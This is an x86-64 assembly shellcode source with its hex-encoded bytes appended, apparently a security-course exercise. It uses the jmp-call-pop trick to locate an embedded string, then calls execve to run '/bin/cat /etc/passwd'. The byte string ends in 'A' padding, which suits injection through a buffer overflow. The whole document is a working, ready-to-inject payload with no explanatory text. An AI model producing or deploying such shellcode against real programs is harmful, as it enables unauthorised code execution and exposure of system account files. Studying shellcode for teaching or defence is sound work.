section .text
global _start

    jmp short c_data
_start:

    pop     rsi
    xor     rax, rax
    mov     byte [rsi + 8], al
    mov     byte [rsi + 20], al

    lea     rdx, 	[rsi]
    mov     qword 	[rsi + 21], rdx   
    lea     rdx, 	[rsi + 9]
    mov     qword 	[rsi + 29], rdx   	
    mov     qword 	[rsi + 37], rax   	

    mov     rdi, 	rsi                	
    lea     rsi, 	[rsi + 21]          	
    mov     rdx, 	rax   
    mov     al, 	59                 
    syscall

c_data:
    call    _start
    db      "/bin/cat:/etc/passwd:AAAAAAAAAAAAAAAAAAAAAAAA"      ; any trailing bytes you used for padding


    \xeb\x2b\x5e\x48\x31\xc0\x88\x46\x08\x88\x46\x14\x48\x8d\x16\x48\x89\x56\x15\x48\x8d\x56\x09\x48\x89\x56\x1d\x48\x89\x46\x25\x48\x89\xf7\x48\x8d\x76\x15\x48\x89\xc2\xb0\x3b\x0f\x05\xe8\xd0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x63\x61\x74\x3a\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x3a\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41%